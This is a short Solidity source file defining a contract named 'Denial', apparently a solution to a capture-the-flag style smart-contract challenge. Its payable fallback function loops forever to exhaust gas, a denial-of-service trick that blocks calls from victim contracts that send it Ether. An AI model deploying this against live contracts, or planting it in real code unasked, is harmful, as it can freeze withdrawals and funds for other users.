// SPDX-License-Identifier: MIT
pragma solidity ^0.6.4;

contract Denial {
  fallback() external payable  {
      while(true) {
      //Always executes until gas limit
    }
  }
}